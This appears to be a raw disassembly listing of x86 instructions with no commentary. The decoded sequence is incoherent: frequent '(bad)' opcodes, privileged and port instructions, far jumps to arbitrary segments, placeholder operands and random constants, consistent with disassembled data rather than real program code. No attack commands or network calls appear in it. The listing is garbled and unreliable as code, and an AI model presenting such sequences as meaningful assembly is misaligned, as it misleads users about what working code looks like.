  421f26:	jg     0x421f18
  421f28:	div    BYTE PTR [ebx]
  421f2a:	mov    esp,DWORD PTR [ecx]
  421f2c:	mov    edi,0x7a7294ec
  421f31:	shl    DWORD PTR [ebp-0x45],0x40
  421f35:	fst    DWORD PTR [ebx]
  421f37:	fwait
  421f38:	mov    ah,0x9b
  421f3a:	adc    dh,bh
  421f3c:	dec    esi
  421f3d:	ret    0xdc16
  421f40:	adc    al,0x61
  421f42:	sar    BYTE PTR [edx+0x43a0f894],1
  421f48:	cmc    
  421f49:	shl    dh,0xa4
  421f4c:	hlt    
  421f4d:	js     0x421fa2
  421f4f:	icebp  
  421f50:	cmc    
  421f51:	or     DWORD PTR [esi+eiz*4-0x79004f6d],eax
  421f58:	fmul   DWORD PTR [eax+0x79]
  421f5b:	jecxz  0x421fa5
  421f5d:	jae    0x421f28
  421f5f:	cmp    eax,0x2cbabb2b
  421f64:	call   0xe36e8eeb
  421f69:	jo     0x421f86
  421f6b:	and    BYTE PTR [esi+0x12238d97],dl
  421f71:	xchg   esp,eax
  421f72:	sub    al,0xa5
  421f74:	in     eax,dx
  421f75:	jae    0x421f0d
  421f77:	push   0xffffffdd
  421f79:	retf   0xa40e
  421f7c:	xor    dl,BYTE PTR [ebp-0x1e]
  421f7f:	(bad)  
  421f80:	into   
  421f81:	xor    al,0x89
  421f83:	pop    ds
  421f84:	aam    0xa0
  421f86:	pop    edi
  421f87:	push   ecx
  421f88:	loop   0x421fe0
  421f8a:	imul   ebp,DWORD PTR [ebx-0xc],0xffffffdc
  421f8e:	mov    al,ds:0x3f7fd245
  421f93:	iret   
  421f94:	or     al,0x38
  421f96:	inc    esi
  421f97:	sub    BYTE PTR [eax],ah
  421f99:	outs   dx,DWORD PTR ds:[si]
  421f9b:	ja     0x421f28
  421f9d:	sub    ebx,DWORD PTR [esi+edi*1+0x4854a6d3]
  421fa4:	push   eax
  421fa5:	iret   
  421fa6:	leave  
  421fa7:	sub    eax,0x9390af12
  421fac:	cmp    edx,DWORD PTR [eax]
  421fae:	lods   al,BYTE PTR ds:[esi]
  421faf:	ret    0x22e1
  421fb2:	inc    esi
  421fb3:	repz call 0xd36a:0xcc8144b0
  421fbb:	(bad)  
  421fbc:	dec    esp
  421fbd:	cs xor eax,0xdbc38eec
  421fc3:	inc    ebp
  421fc4:	jge    0x421fa0
  421fc6:	and    BYTE PTR [edx],0xb8
  421fc9:	xor    esp,DWORD PTR [eax-0x1081f343]
  421fcf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421fd0:	(bad)  
  421fd1:	sbb    eax,0x34f9fa49
  421fd6:	rcl    DWORD PTR [ebx],cl
  421fd8:	jne    0x421f8a
  421fda:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421fdb:	repnz popa 
  421fdd:	dec    ebp
  421fde:	fisttp DWORD PTR [ebx+esi*8-0x59]
  421fe2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421fe3:	push   ebp
  421fe4:	mov    ds:0x78c7605e,al
  421fe9:	sbb    BYTE PTR [esi-0x28],dh
  421fec:	mov    dh,0x6c
  421fee:	jp     0x422014
  421ff0:	or     DWORD PTR [esi-0x306570e5],edx
  421ff6:	adc    BYTE PTR [edi],ch
  421ff8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421ff9:	cmc    
  421ffa:	lods   eax,DWORD PTR ds:[esi]
  421ffb:	and    eax,0x892ef0aa
  422000:	mov    dl,0x77
  422002:	daa    
  422003:	sub    edi,DWORD PTR [eax+0x0]
	...
  42200e:	add    BYTE PTR [eax],al
  422010:	add    BYTE PTR [edx+0x4f],al
  422013:	nop
  422014:	int3   
  422015:	popf   
  422016:	fistp  WORD PTR [esi-0x31]
  422019:	lea    ecx,[ebx]
  42201b:	jmp    0xd7f9cb76
  422020:	(bad)  
  422021:	cmp    eax,0xac000199
  422026:	add    eax,DWORD PTR [eax]
  422028:	add    BYTE PTR [ebp+0x54],bh
  42202b:	mov    ah,0xc4
  42202d:	cmp    cl,BYTE PTR [edx+eax*1-0x2ff19acb]
  422034:	and    ah,al
  422036:	cmp    ecx,ebx
  422038:	cdq    
  422039:	scas   al,BYTE PTR es:[edi]
  42203a:	or     eax,0xb6734792
  42203f:	out    0x13,al
  422041:	jl     0x422030
  422043:	inc    ecx
  422044:	repnz imul edx,DWORD PTR [edi+0x192b9153],0x66
  42204c:	shr    BYTE PTR [esi+0x4c679243],1
  422052:	dec    eax
  422053:	stc    
  422054:	pop    edx
  422055:	jl     0x42201e
  422057:	xchg   DWORD PTR [eax+edx*2],esi
  42205a:	push   esp
  42205b:	in     eax,dx
  42205c:	icebp  
  42205d:	push   es
  42205e:	mov    al,BYTE PTR [eax-0x13aa06dd]
  422064:	cmp    ebx,DWORD PTR [edi-0x1d3f02da]
  42206a:	xchg   edx,eax
  42206b:	test   al,0x22
  42206d:	ffree  st(5)
  42206f:	inc    ebx
  422070:	xor    al,0xc
  422072:	leave  
  422073:	ja     0x4220b0
  422075:	repz xchg edi,eax
  422077:	paddsb mm6,QWORD PTR [esi]
  42207a:	fst    DWORD PTR [edi]
  42207c:	sbb    DWORD PTR [esi],eax
  42207e:	in     al,0x93
  422080:	sub    ebp,edi
  422082:	fmul   QWORD PTR [eax+esi*4]
  422085:	xor    al,0xa2
  422087:	mov    bh,0x8f
  422089:	cmc    
  42208a:	xchg   ecx,eax
  42208b:	pop    esp
  42208c:	ins    DWORD PTR es:[edi],dx
  42208d:	pop    eax
  42208e:	(bad)  
  42208f:	ins    BYTE PTR es:[edi],dx
  422090:	outs   dx,BYTE PTR ds:[esi]
  422091:	dec    ecx
  422092:	in     eax,dx
  422093:	shl    esp,1
  422095:	stc    
  422096:	sub    BYTE PTR [esi-0x48],ch
  422099:	or     eax,0xa74f05f2
  42209e:	sbb    cl,BYTE PTR [eax-0x291f1ea]
  4220a4:	adc    al,0xbe
  4220a6:	(bad)  
  4220a7:	pop    eax
  4220a8:	pop    ds
  4220a9:	push   ebp
  4220aa:	arpl   WORD PTR [edi+0x2e660906],bp
  4220b0:	or     al,0xf1
  4220b2:	adc    BYTE PTR [ecx+ecx*2],0xd4
  4220b6:	retf   0x6620
  4220b9:	xchg   ebp,eax
  4220ba:	fs push edi
  4220bc:	inc    ebp
  4220bd:	xor    BYTE PTR [ebx],0x21
  4220c0:	in     eax,dx
  4220c1:	inc    edx
  4220c2:	jnp    0x4220eb
  4220c4:	xchg   al,dh
  4220c6:	gs dec ebp
  4220c8:	fadd   DWORD PTR [eax+0x2d]
  4220cb:	int    0x42
  4220cd:	fwait
  4220ce:	xchg   DWORD PTR [ebp+0x351ca604],edi
  4220d4:	dec    ecx
  4220d5:	jmp    0x4220cf
  4220d7:	ficomp DWORD PTR [ebp-0xe]
  4220da:	outs   dx,BYTE PTR ds:[esi]
  4220db:	jb     0x4220d2
  4220dd:	push   0x63
  4220df:	cmp    dh,BYTE PTR [esi]
  4220e1:	leave  
  4220e2:	aaa    
  4220e3:	imul   ebx,DWORD PTR [eax+0x7e],0x93361437
  4220ea:	in     eax,dx
  4220eb:	xchg   ebx,eax
  4220ec:	call   0x46a726f
  4220f1:	pop    ebx
  4220f2:	fsub   DWORD PTR [esi+0x46]
  4220f5:	aaa    
  4220f6:	(bad)  
  4220f7:	rol    ch,0x8b
  4220fa:	out    0x63,eax
  4220fc:	ins    DWORD PTR es:[edi],dx
  4220fd:	pop    es
  4220fe:	ins    BYTE PTR es:[edi],dx
  4220ff:	sub    BYTE PTR [eax+edx*1-0x3c],bh
  422103:	cli    
  422104:	mov    bl,0x98
  422106:	xor    al,0xe8
  422108:	jno    0x4220ad
  42210a:	lea    esi,ds:0x62c429b2
  422110:	mov    ebx,0x4204e1a4
  422115:	pushf  
  422116:	jp     0x4220a7
  422118:	bound  edx,QWORD PTR [edi+edx*4-0x60]
  42211c:	push   ds
  42211d:	sbb    edi,DWORD PTR [edx+ebp*2+0x683c9f11]
  422124:	xor    eax,0xa798ab38
  422129:	jg     0x422105
  42212b:	adc    ebx,edi
  42212d:	add    ebp,edx
  42212f:	or     ch,ah
  422131:	mov    bh,BYTE PTR [edx-0x15]
  422134:	fisub  DWORD PTR [edi+0x2]
  422137:	or     al,al
  422139:	leave  
  42213a:	pop    edx
  42213b:	dec    ebx
  42213c:	es (bad) 
  42213f:	stos   BYTE PTR es:[edi],al
  422140:	xor    DWORD PTR [ebp+0x48],edx
  422143:	gs jno 0x42215c
  422146:	pusha  
  422147:	pop    esi
  422148:	imul   BYTE PTR [ebp+esi*2-0x11]
  42214c:	test   al,0x4c
  42214e:	ret    0xb5ac
  422151:	ins    BYTE PTR es:[edi],dx
  422152:	cwde   
  422153:	retf   
  422154:	pop    ss
  422155:	or     eax,0x1a0999ee
  42215a:	sbb    ebx,esp
  42215c:	inc    esp
  42215d:	push   eax
  42215e:	sbb    DWORD PTR [edx+edi*1],ebx
  422161:	jmp    0xf1fc:0x1e047a33
  422168:	aaa    
  422169:	fwait
  42216a:	mov    gs,esi
  42216c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42216d:	scas   eax,DWORD PTR es:[edi]
  42216e:	jl     0x42219d
  422170:	popf   
  422171:	mov    edi,ebp
  422173:	mov    eax,ds:0xdbdc3dc8
  422178:	sub    cl,dh
  42217a:	jp     0x4221dd
  42217c:	imul   esi,DWORD PTR [ebp+0xd984d03],0x7c4b59
  422186:	rol    BYTE PTR [eax],cl
  422188:	jmp    0xe886:0x7d16fff
  42218f:	lahf   
  422190:	cmp    BYTE PTR [ecx-0x6b],bh
  422193:	xchg   BYTE PTR [edx+0x18bbf898],dh
  422199:	xor    DWORD PTR [ecx-0x6b],0xe5a9fc47
  4221a0:	sbb    al,0xa7
  4221a2:	jo     0x422148
  4221a4:	in     eax,0x4e
  4221a6:	mov    ch,0x6
  4221a8:	into   
  4221a9:	mov    BYTE PTR [esi+0x29],ch
  4221ac:	repz dec edi
  4221ae:	sbb    eax,0x759df54
  4221b3:	mov    cl,0xc2
  4221b5:	sbb    al,0xa
  4221b7:	jno    0x42214d
  4221b9:	daa    
  4221ba:	xor    al,0x2d
  4221bc:	cwde   
  4221bd:	or     eax,0xd6189163
  4221c2:	pop    es
  4221c3:	inc    ebx
  4221c4:	mov    ah,0x5d
  4221c6:	je     0x4221b7
  4221c8:	sub    ebx,esp
  4221ca:	outs   dx,BYTE PTR ds:[esi]
  4221cb:	mov    esp,0x6324fa29
  4221d0:	stos   BYTE PTR es:[edi],al
  4221d1:	imul   esp,edi,0x1d
  4221d4:	aas    
  4221d5:	enter  0xf37d,0xa2
  4221d9:	vpaddusw xmm1,xmm5,XMMWORD PTR [ecx]
  4221dd:	and    al,BYTE PTR [esi+edx*1]
  4221e0:	adc    DWORD PTR [ebx+0x5e320256],esi
  4221e6:	repnz push ds
  4221e8:	pop    esi
  4221e9:	jmp    0x4221b6
  4221eb:	xor    ebp,0x423de6d6
  4221f1:	aad    0xe8
  4221f3:	xor    BYTE PTR [eax+0x6acd56e8],bh
  4221f9:	dec    edx
  4221fa:	push   ecx
  4221fb:	repz loop 0x4221b7
  4221fe:	push   ecx
  4221ff:	loop   0x42225d
  422201:	fs jno 0x4221f3
  422204:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422205:	neg    BYTE PTR [ebx]
  422207:	xchg   ecx,eax
  422208:	mov    ds:0x16f5b11b,al
  42220d:	pop    esp
  42220e:	xor    BYTE PTR [esi+0x34],ah
  422211:	not    BYTE PTR [ebp+0x59]
  422214:	inc    ebx
  422215:	push   0x7f1ca373
  42221a:	out    0x68,eax
  42221c:	shr    DWORD PTR [ebx+ebp*8+0x17],cl
  422220:	inc    eax
  422221:	pop    edx
  422222:	xchg   ebx,eax
  422223:	jmp    DWORD PTR [ecx]
  422225:	push   esi
  422226:	jo     0x422277
  422228:	sub    ebp,DWORD PTR [ebx]
  42222a:	adc    DWORD PTR [ecx+0x32b0eb48],ebx
  422230:	scas   eax,DWORD PTR es:[edi]
  422231:	lahf   
  422232:	mov    bh,BYTE PTR [ebp+0x672d01da]
  422238:	ja     0x422295
  42223a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42223b:	lds    esi,FWORD PTR [eax]
  42223d:	mov    edx,0xe56775d8
  422242:	inc    esi
  422243:	lods   eax,DWORD PTR es:[esi]
  422245:	push   ebp
  422246:	cs ins DWORD PTR es:[edi],dx
  422248:	mov    ebp,0x78366597
  42224d:	data16 mov ch,0x76
  422250:	jmp    0x422298
  422252:	dec    esi
  422253:	mov    bl,bl
  422255:	jl     0x4221de
  422257:	mov    ebp,0xecb72342
  42225c:	loop   0x4222c0
  42225e:	push   esp
  42225f:	jne    0x42226c
  422261:	jmp    0x4222ce
  422263:	ins    DWORD PTR es:[edi],dx
  422264:	sbb    DWORD PTR [ecx-0x7266332e],ebx
  42226a:	imul   eax,DWORD PTR [ebx+0x7c661fe8],0x4528a452
  422274:	push   ss
  422275:	ror    BYTE PTR [eax-0x787649b9],cl
  42227b:	jno    0x422270
  42227d:	fnstsw WORD PTR [edx]
  42227f:	pop    esi
  422280:	xchg   DWORD PTR [ebx-0x5d2ae773],ebp
  422286:	(bad)  
  422287:	cli    
  422288:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  42228a:	test   eax,0x4e69cdee
  42228f:	fnop   
  422291:	push   ebx
  422292:	fdivr  QWORD PTR [ecx+0x16eabbe5]
  422298:	sub    eax,0x224d7e19
  42229d:	cwde   
  42229e:	sbb    esi,DWORD PTR [eax-0x2]
  4222a1:	retf   
  4222a2:	int    0x40
  4222a4:	outs   dx,BYTE PTR ds:[esi]
  4222a5:	pop    eax
  4222a6:	jb     0x42223a
  4222a8:	les    esp,FWORD PTR [ebx-0x9]
  4222ab:	or     eax,0x17704809
  4222b0:	adc    al,dl
  4222b2:	cmc    
  4222b3:	mov    edx,0x3836034d
  4222b8:	xchg   esp,eax
  4222b9:	push   edx
  4222ba:	imul   ebp,DWORD PTR es:[eax*4-0x3a0ed857],0x26dff95d
  4222c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4222c7:	(bad)  
  4222c8:	sbb    edx,DWORD PTR [esi+0x25e9db2]
  4222ce:	mov    ds:0x7891d43e,al
  4222d3:	aam    0x7e
  4222d5:	and    esp,DWORD PTR [ebx+edi*8-0x1f1efd14]
  4222dc:	loope  0x42232f
  4222de:	mov    dl,0x53
  4222e0:	call   ebx
  4222e2:	jle    0x4222d5
  4222e4:	out    dx,eax
  4222e5:	loop   0x42233c
  4222e7:	push   ebx
  4222e8:	xor    dl,BYTE PTR [eax]
  4222ea:	aad    0xfb
  4222ec:	jo     0x422365
  4222ee:	jmp    0x422364
  4222f0:	clc    
  4222f1:	fwait
  4222f2:	rol    al,1
  4222f4:	inc    BYTE PTR [ecx+0x1d8c4e90]
  4222fa:	je     0x422290
  4222fc:	ins    BYTE PTR es:[edi],dx
  4222fd:	repnz xchg esi,eax
  4222ff:	fwait
  422300:	mov    BYTE PTR [eax+0x0],0x1f
  422304:	ret    
  422305:	pop    ebp
  422306:	inc    ebx
  422307:	(bad)  
  422308:	sbb    DWORD PTR [edi],esi
  42230a:	jmp    0x422375
  42230c:	loopne 0x422360
  42230e:	push   edx
  42230f:	dec    esp
  422310:	jg     0x42233b
  422312:	or     DWORD PTR [ecx+0x782a6ef7],0x1
  422319:	stos   DWORD PTR es:[edi],eax
  42231a:	ins    BYTE PTR es:[edi],dx
  42231b:	nop
  42231c:	(bad)  
  42231d:	inc    ebx
  42231e:	sbb    esi,DWORD PTR [edi+ebx*8]
  422321:	dec    eax
  422322:	mov    ah,0xfb
  422324:	loop   0x42234b
  422326:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422327:	xor    esi,ebp
  422329:	push   edx
  42232a:	cmp    cl,BYTE PTR [ebx-0x3671e63f]
  422330:	cmc    
  422331:	out    0xe7,al
  422333:	or     esi,DWORD PTR [esi-0x55]
  422336:	mov    ah,0x14
  422338:	and    DWORD PTR [ebp+ebp*1-0x51068d18],eax
  42233f:	test   BYTE PTR [esi+0x6ab560a4],bh
  422345:	loope  0x4222f6
  422347:	adc    eax,0x7c709074
  42234c:	jl     0x4223b9
  42234e:	mov    esi,0xddb2e66
  422353:	or     DWORD PTR [ecx-0x6e],0x199e3cd2
  42235a:	mov    al,0x37
  42235c:	jl     0x42234a
  42235e:	sbb    dh,ch
  422360:	and    BYTE PTR [esi],bh
  422362:	shl    DWORD PTR [ebx+0x49dbba44],cl
  422368:	and    ebp,DWORD PTR [edx+0x2]
  42236b:	mov    ebp,edx
  42236d:	pop    edi
  42236e:	or     eax,0x1f1d7495
  422373:	xchg   ecx,esp
  422375:	scas   al,BYTE PTR es:[edi]
  422376:	mov    ecx,0x7c95a803
  42237b:	pop    esi
  42237c:	dec    edx
  42237d:	aad    0x8
  42237f:	push   edi
  422380:	sahf   
  422381:	rol    dl,1
  422383:	scas   al,BYTE PTR es:[edi]
  422384:	jbe    0x422378
  422386:	or     eax,0x7853bdee
  42238b:	jmp    0x76a6:0x6fc192ae
  422392:	cdq    
  422393:	adc    ebx,DWORD PTR [esi+0x505df6b]
  422399:	push   ebx
  42239a:	and    bl,ah
  42239c:	test   BYTE PTR [ecx+esi*1+0x35977ecc],cl
  4223a3:	(bad)  
  4223a4:	push   ebx
  4223a5:	xchg   BYTE PTR [eax+ebx*1-0x37453cad],ah
  4223ac:	in     eax,dx
  4223ad:	outs   dx,DWORD PTR ds:[esi]
  4223ae:	or     DWORD PTR [edx+0x642b99fa],esp
  4223b4:	repnz and edi,DWORD PTR [edi]
  4223b7:	inc    edi
  4223b8:	frstor [edi+0x1842e54]
  4223be:	mov    al,0xe3
  4223c0:	ins    DWORD PTR es:[edi],dx
  4223c1:	fbld   TBYTE PTR [ecx-0x814887c]
  4223c7:	and    eax,0xb76b984f
  4223cc:	inc    esp
  4223cd:	xlat   BYTE PTR ds:[ebx]
  4223ce:	sbb    eax,0x65d86c15
  4223d3:	into   
  4223d4:	ins    BYTE PTR es:[edi],dx
	...
  4223e1:	data16 jl 0x4223c4
  4223e4:	mov    ebx,0xfd7fbffa
  4223e9:	pop    esp
  4223ea:	mov    eax,ds:0x23954f5c
  4223ef:	fwait
  4223f0:	aad    0xe9
  4223f2:	pushf  
  4223f3:	add    DWORD PTR [eax],eax
  4223f5:	lods   al,BYTE PTR ds:[esi]
  4223f6:	add    eax,DWORD PTR [eax]
  4223f8:	add    BYTE PTR [eax+ebx*4+0x4143bc64],cl
  4223ff:	dec    ebp
  422400:	inc    edi
  422401:	aad    0xf3
  422403:	mov    al,ds:0x989bffa2
  422408:	rcr    DWORD PTR [edi-0x64],0x83
  42240c:	xchg   BYTE PTR [eax+0x9372842],bh
  422412:	inc    edi
  422413:	cmp    DWORD PTR [ecx+0x4bd64a91],edi
  422419:	rcr    BYTE PTR [ebx+eax*8-0x535365ab],cl
  422420:	dec    ebx
  422421:	push   ecx
  422422:	adc    eax,0x9cb44285
  422427:	mov    BYTE PTR [ebx+ebx*8+0x14b58a1d],cl
  42242e:	fistp  DWORD PTR [ebx+0x16]
  422431:	mov    eax,DWORD PTR [eax]
  422433:	dec    edi
  422434:	call   DWORD PTR [eax+0x5597dad6]
  42243a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42243b:	fs je  0x422434
  42243e:	outs   dx,DWORD PTR gs:[esi]
  422440:	lahf   
  422441:	test   DWORD PTR [ebp+0x4a],ebx
  422444:	hlt    
  422445:	xchg   BYTE PTR [esi],dh
  422447:	cmp    cl,bh
  422449:	imul   DWORD PTR ds:0x14bf6be4
  42244f:	leave  
  422450:	mov    dl,0x68
  422452:	pop    es
  422453:	(bad)
  422456:	jnp    0x4224cf
  422458:	xor    ecx,DWORD PTR [esi]
  42245a:	pop    edx
  42245b:	push   0xd
  42245d:	into   
  42245e:	and    DWORD PTR [ecx+0x431e2495],edx
  422464:	ror    BYTE PTR [ecx],0x4f
  422467:	jp     0x4224a6
  422469:	mov    ecx,0x60c1da2b
  42246e:	mov    ebx,0x7a284db3
  422473:	push   ebp
  422474:	pop    edi
  422475:	jl     0x42247c
  422477:	cwde   
  422478:	mov    dl,0xa4
  42247a:	inc    eax
  42247b:	and    eax,0x4eb3a207
  422480:	or     al,0x83
  422482:	pop    ebx
  422483:	outs   dx,BYTE PTR ds:[esi]
  422484:	xchg   edx,eax
  422485:	jae    0x4224c0
  422487:	mov    esi,0xe2f815c9
  42248c:	pop    ds
  42248d:	enter  0x5f0d,0x81
  422491:	inc    ebp
  422492:	sub    dh,dh
  422494:	pop    esp
  422495:	push   esp
  422496:	call   0xa5708b6e
  42249b:	mov    edi,esp
  42249d:	or     eax,0x15453cbf
  4224a2:	cmp    DWORD PTR [edx-0x7291ae5c],esi
  4224a8:	pop    ds
  4224a9:	hlt    
  4224aa:	test   DWORD PTR ds:0x8b5c8ae5,esp
  4224b0:	pop    edx
  4224b1:	fld    QWORD PTR [edx]
  4224b3:	mov    al,BYTE PTR [edx+0x37738946]
  4224b9:	jae    0x422534
  4224bb:	inc    BYTE PTR [edx+0x32]
  4224be:	ror    DWORD PTR [ebx-0x56],1
  4224c1:	retf   0xcd31
  4224c4:	data16 sub BYTE PTR [esi-0x4d5d45a6],ch
  4224cb:	or     DWORD PTR [eax+eax*4+0x7f],esi
  4224cf:	xchg   ecx,eax
  4224d0:	ss ret 0x3657
  4224d4:	mov    BYTE PTR [esi],al
  4224d6:	or     cl,bh
  4224d8:	mov    eax,0x5807b22a
  4224dd:	pop    ebx
  4224de:	shr    DWORD PTR [ecx+ebx*8-0x71636e10],cl
  4224e5:	cmc    
  4224e6:	cli    
  4224e7:	mov    bh,BYTE PTR [eax+0x72c3677f]
  4224ed:	outs   dx,DWORD PTR ds:[esi]
  4224ee:	loopne 0x422493
  4224f0:	inc    edx
  4224f1:	pandn  mm5,QWORD PTR [ebp-0x51]
  4224f5:	fidivr DWORD PTR [ebx+0x4b5eebce]
  4224fb:	es push eax
  4224fd:	xlat   BYTE PTR ds:[ebx]
  4224fe:	popf   
  4224ff:	add    DWORD PTR [edx],eax
  422501:	in     eax,dx
  422502:	(bad)  
  422503:	xor    BYTE PTR [ecx],bh
  422505:	int3   
  422506:	loop   0x422571
  422508:	or     eax,esi
  42250a:	pop    eax
  42250b:	mov    bh,0x7a
  42250d:	loope  0x4224a0
  42250f:	lds    esp,FWORD PTR [edx+eax*1-0x27f12fb2]
  422516:	push   es
  422517:	mov    esp,0xa7362d63
  42251c:	xchg   esp,eax
  42251d:	fisubr DWORD PTR ds:0x5ea1f895
  422523:	sub    DWORD PTR [edi],0x52
  422526:	xor    ah,BYTE PTR [ebx+0x16640452]
  42252c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42252d:	push   edx
  42252e:	push   ebx
  42252f:	out    dx,eax
  422530:	jecxz  0x4224d7
  422532:	cmc    
  422533:	loop   0x422596
  422535:	or     eax,0xa8897dcd
  42253a:	repz (bad) 
  42253c:	cmp    eax,0x2136a9f0
  422541:	dec    edx
  422542:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422543:	mov    ah,0x33
  422545:	and    ebx,DWORD PTR [ebx+ebx*4]
  422548:	or     dh,ch
  42254a:	mov    dl,0x67
  42254c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42254d:	jmp    0x422506
  42254f:	inc    edi
  422550:	(bad)  
  422551:	jp     0x42251e
  422553:	cmp    eax,0x6e2f3f19
  422558:	pop    ds
  422559:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42255a:	mov    ebp,0xedca5a9a
  42255f:	outs   dx,DWORD PTR ds:[esi]
  422560:	fbld   TBYTE PTR [eax+0x60]
  422563:	xor    DWORD PTR [edx],esp
  422565:	inc    esi
  422566:	jge    0x42257a
  422568:	xlat   BYTE PTR ds:[ebx]
  422569:	xor    eax,0x3626506b
  42256e:	or     BYTE PTR ss:[ebp-0x71],dh
  422572:	jg     0x4225b3
  422574:	sub    eax,0xb69f63c7
  422579:	inc    esi
  42257a:	sbb    ecx,esi
  42257c:	xchg   DWORD PTR [ecx+0x6],ecx
  42257f:	mov    dh,BYTE PTR [eax]
  422581:	jecxz  0x4225a4
  422583:	pop    ecx
  422584:	fdivr  QWORD PTR [ebx+ebx*1]
  422587:	call   0x32a1065f
  42258c:	sub    DWORD PTR [esp+esi*8+0x38],eax
  422590:	mov    ebp,0x6a3cf31b
  422595:	add    BYTE PTR [ecx],cl
  422597:	rol    ch,cl
  422599:	arpl   WORD PTR [ecx],bp
  42259b:	sub    BYTE PTR [ebp+0xc9a0e31],al
  4225a1:	mov    ch,0x16
  4225a3:	dec    ebx
  4225a4:	inc    edx
  4225a5:	out    0x4f,eax
  4225a7:	ss inc eax
  4225a9:	dec    eax
  4225aa:	adc    eax,0x21365625
  4225af:	fld    st(3)
  4225b1:	or     DWORD PTR [edi+0x3f],esp
  4225b4:	and    DWORD PTR [edx+0x9],0xffffffd5
  4225b8:	fistp  DWORD PTR [eax-0x74]
  4225bb:	adc    esp,DWORD PTR [edi+0x7f]
  4225be:	retf   
  4225bf:	pop    esp
  4225c0:	in     eax,dx
  4225c1:	stc    
  4225c2:	arpl   WORD PTR [ebp+0x661cbb67],bp
  4225c8:	adc    BYTE PTR [ebx],bl
  4225ca:	loopne 0x4225e3
  4225cc:	cmp    BYTE PTR [ebx],0x9f
  4225cf:	or     dh,BYTE PTR [ecx-0x9]
  4225d2:	int3   
  4225d3:	in     eax,0xc
  4225d5:	xor    esp,esp
  4225d7:	js     0x4225b8
  4225d9:	clc    
  4225da:	push   ebp
  4225db:	mov    ch,BYTE PTR [edi+0x60e32c5b]
  4225e1:	inc    ebp
  4225e2:	rcl    BYTE PTR [ecx],cl
  4225e4:	mov    bh,0x26
  4225e6:	jns    0x4225d7
  4225e8:	out    dx,al
  4225e9:	or     al,0x9e
  4225eb:	pop    ebx
  4225ec:	push   eax
  4225ed:	dec    ebx
  4225ee:	sub    eax,0x5bb88a4d
  4225f3:	cmp    DWORD PTR [edx+edx*8],esp
  4225f6:	add    al,0x4c
  4225f8:	sbb    al,0xf3
  4225fa:	push   0x47
  4225fc:	rcl    DWORD PTR [ecx-0x4ada852a],cl
  422602:	nop
  422603:	jle    0x42259a
  422605:	cmp    eax,0x304da223
  42260a:	hlt    
  42260b:	mov    edx,0x4a623b59
  422610:	mov    ds:0x6055438f,eax
  422615:	pop    es
  422616:	xor    eax,DWORD PTR [ecx+ecx*8]
  422619:	rol    bh,1
  42261b:	cmp    DWORD PTR [esi],0x3c9ed338
  422621:	xor    BYTE PTR [edi+edi*8],dh
  422624:	aad    0x95
  422626:	xchg   ebp,eax
  422627:	mov    ds:0x7ece3c73,eax
  42262c:	data16 mov ah,0x7f
  42262f:	sub    DWORD PTR [ebp+0x5e],ecx
  422632:	mov    dh,0x52
  422634:	rol    DWORD PTR [esi+0x76c0b5f4],0x21
  42263b:	dec    ebx
  42263c:	into   
  42263d:	dec    eax
  42263e:	sti    
  42263f:	jno    0x422664
  422641:	fcmovnu st,st(7)
  422643:	and    al,dl
  422645:	sub    cl,BYTE PTR [esi]
  422647:	lock sbb DWORD PTR ds:0xa8a18bc9,0x3177d7e4
  422652:	mov    ebx,?
  422654:	jns    0x4225fb
  422656:	xrelease mov DWORD PTR [ecx+0x60],ebp
  42265a:	and    eax,0xda776f0a
  42265f:	add    eax,0x692d96fe
  422664:	std    
  422665:	je     0x422672
  422667:	push   ss
  422668:	xchg   ecx,eax
  422669:	inc    esi
  42266a:	sub    ebx,ebp
  42266c:	add    DWORD PTR [eax],eax
  42266e:	mov    WORD PTR [esp+esi*1],gs
  422671:	mov    esp,DWORD PTR ds:0x1bff2914
  422677:	sub    al,0xf8
  422679:	add    bh,BYTE PTR [edi+0x789b706f]
  42267f:	rcl    BYTE PTR [edi-0x74],0xe
  422683:	hlt    
  422684:	jl     0x422702
  422686:	jge    0x42260c
  422688:	in     al,dx
  422689:	mov    DWORD PTR [ebp+0x4e],esi
  42268c:	cmc    
  42268d:	or     bh,dl
  42268f:	or     DWORD PTR [eax],esi
  422691:	jno    0x4226c2
  422693:	lods   al,BYTE PTR ds:[esi]
  422694:	or     dl,BYTE PTR [edx+0x2d]
  422697:	mov    ?,WORD PTR [ebp-0x5cc81d50]
  42269d:	lods   al,BYTE PTR ds:[esi]
  42269e:	and    eax,0x359b49e4
  4226a3:	xchg   edx,eax
  4226a4:	inc    esp
  4226a5:	retf   0x3ffb
  4226a8:	or     al,0xd
  4226aa:	cmp    BYTE PTR [edi],0x83
  4226ad:	pushf  
  4226ae:	sbb    DWORD PTR [edx+0x35],edx
  4226b1:	pop    eax
  4226b2:	ds (bad) 
  4226b5:	inc    esi
  4226b6:	data16 jp 0x4226c6
  4226b9:	loope  0x422703
  4226bb:	cmp    al,0x94
  4226bd:	add    eax,0xefe41492
  4226c2:	and    al,0xa8
  4226c4:	das    
  4226c5:	pop    edi
  4226c6:	jmp    0xd5d0:0xd4bae520
  4226cd:	xor    DWORD PTR [ebx],0x7f
  4226d0:	push   ds
  4226d1:	xor    esi,DWORD PTR ds:0x220ee6eb
  4226d7:	mov    ah,0xc9
  4226d9:	adc    eax,0xa9ffdfee
  4226de:	loopne 0x422758
  4226e0:	xchg   esp,eax
  4226e1:	call   0x7192:0x6fd3d726
  4226e8:	and    DWORD PTR [esi+0x1],0x3b3825bb
  4226ef:	xchg   edi,eax
  4226f0:	cmp    ch,al
  4226f2:	cmp    bl,BYTE PTR [ecx-0x79]
  4226f5:	inc    edi
  4226f6:	daa    
  4226f7:	pop    es
  4226f8:	and    eax,DWORD PTR [esi]
